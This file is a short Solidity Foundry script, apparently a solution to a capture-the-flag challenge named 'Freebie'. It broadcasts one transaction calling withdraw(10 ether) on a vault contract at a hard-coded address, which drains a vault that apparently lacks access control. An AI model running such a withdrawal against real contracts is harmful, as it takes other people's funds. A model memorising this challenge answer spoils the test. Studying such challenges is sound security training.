// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

interface IVault {
    function withdraw(uint256 amount) external;
}

contract SolveFreebie is Script {
    function run() public {
        vm.startBroadcast();
        IVault vault = IVault(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
        vault.withdraw(10 ether);
    }
}